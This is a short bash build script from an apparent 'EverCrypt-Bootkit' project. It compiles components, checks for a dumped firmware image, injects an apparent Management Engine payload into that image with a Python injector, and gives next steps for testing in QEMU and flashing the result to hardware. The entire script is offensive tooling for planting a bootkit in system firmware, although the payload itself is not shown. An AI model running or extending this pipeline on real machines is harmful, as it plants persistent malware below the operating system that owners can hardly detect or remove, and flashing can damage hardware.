#!/bin/bash
# Full build pipeline: Source → Binaries → Injected Firmware

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}╔═══════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║   EVERCRYPT FULL BUILD + INJECTION PIPELINE  ║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════╝${NC}"
echo ""

# Build all components
cd ~/EverCrypt-Bootkit
./build_all.sh

# Inject into firmware
echo ""
echo -e "${YELLOW}[*] Injecting into firmware image...${NC}"

FIRMWARE_IN="firmware_backup.bin"
FIRMWARE_OUT="firmware_evercrypt.bin"

if [ ! -f "$FIRMWARE_IN" ]; then
    echo -e "${RED}[!] No firmware backup found!${NC}"
    echo "Please dump your firmware first:"
    echo "  cd tools/flasher && cargo run -- read -o ../../firmware_backup.bin"
    exit 1
fi

python3 tools/me_analyzer/inject_payload.py \
    "$FIRMWARE_IN" \
    me_payload/build/evercrypt_me_padded.bin \
    "$FIRMWARE_OUT"

echo ""
echo -e "${GREEN}[✓] FIRMWARE BUILD COMPLETE${NC}"
echo ""
echo "Next steps:"
echo "  1. Verify in QEMU: qemu-system-x86_64 -bios $FIRMWARE_OUT"
echo "  2. Flash (DANGEROUS): cd tools/flasher && cargo run -- write -i ../../$FIRMWARE_OUT"